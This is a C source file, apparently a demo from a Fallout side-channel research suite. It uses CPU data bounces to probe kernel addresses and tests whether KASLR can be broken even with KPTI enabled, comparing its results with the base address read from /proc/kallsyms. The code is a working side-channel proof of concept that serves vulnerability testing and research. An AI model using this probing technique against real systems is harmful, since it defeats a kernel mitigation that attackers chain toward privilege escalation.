#include "../primitives/basic_primitives.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sched.h>
#include <linux/version.h>

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 0, 0) //TODO: Find the exact version that introduced this change
#define KASLR_ALIGNMENT 0x1000000ll
#define KPTI_MAPPED_PAGE_OFFSET 0xa00000ll
#else
#define KASLR_ALIGNMENT 0x100000ll
#define KPTI_MAPPED_PAGE_OFFSET 0x800000ll
#endif

#define ADDRESS_RANGE_START (void*) 0xffffffff80000000ull
#define KALLSYMS "/proc/kallsyms"
#define REPS 500

uint64_t get_kernel_base() {
    ssize_t len = 1024;
    FILE *kallsysms_fd = fopen(KALLSYMS, "r");
    char *read_buffer = NULL, *sym = malloc(len);
    uint64_t address = 0;
    char t = 0;
    while (getline(&read_buffer, &len, kallsysms_fd)) {
        memset(sym, 0, 1024);
        sscanf(read_buffer, "%lx %c %s", &address, &t, sym);
        if (strcmp(sym, "_text") == 0) break;
        address = 0;
    }
    if (read_buffer) free(read_buffer);
    free(sym);
    fclose(kallsysms_fd);
    return address;
}

int main() {
    if (!fallout_compatible()) {
        printf("Your Processor Architecture is not supported by this demo!\n");
        return 1;
    }
    void *base_addr = (void *) get_kernel_base(), *addr = ADDRESS_RANGE_START;
    if (!base_addr) {
        printf("Could not open /proc/kallsyms! Make sure that you run this demo as root!\n");
        return 1;
    }
    int
    page_size = getpagesize();
    uint8_t *mem = aligned_alloc(page_size, page_size * 256);
    memset(mem, 0xFF, page_size * 256);
    fallout_init();
    printf("Demo 4: Breaking KASLR\n");
    printf("From reading /proc/kallsyms, we determined that the base address of your kernel's .text section is %p.\nIf we can find this address using data bounces, your system is vulnerable.\n",
           base_addr);
    uint64_t delta = 0, kpti_offset = 0;
    char *loading = "-\\|/";
    while (1) {
        printf("[%p... %c]                     \r", addr + delta + kpti_offset, loading[(delta / KASLR_ALIGNMENT) % 4]);
        fflush(stdout);
        if (data_bounce(mem, addr + delta + kpti_offset, REPS)) {
            if (base_addr == addr + delta) {
                if(!kpti_offset) printf("An unusual amount of hits was detected at %p, so KASLR was successfully broken.\n", addr + delta + kpti_offset);
                else printf("An unusual amount of hits was detected at %p (meaning that your kernel's base address is %p), so KASLR was successfully broken.\nThis happened despite KPTI being enabled on your system!\n", addr+delta+kpti_offset, addr+delta);
                break;
            }
            else {
                printf("An unusual amount of hits was detected at %p. This suggests that the address is used by the kernel.\n",
                       addr + delta + kpti_offset);
            }
        }
        if(!kpti_offset) kpti_offset = KPTI_MAPPED_PAGE_OFFSET;
        else {
            kpti_offset = 0;
            delta += KASLR_ALIGNMENT;
        }
        if ((uint64_t)addr + delta > (uint64_t)base_addr){
            printf("There was no significant increase in data bounce hits at the kernel's base offset, so KALSR was not broken.\n");
            break;
        }
    }
    free(mem);
    fallout_cleanup();
    return 0;
}
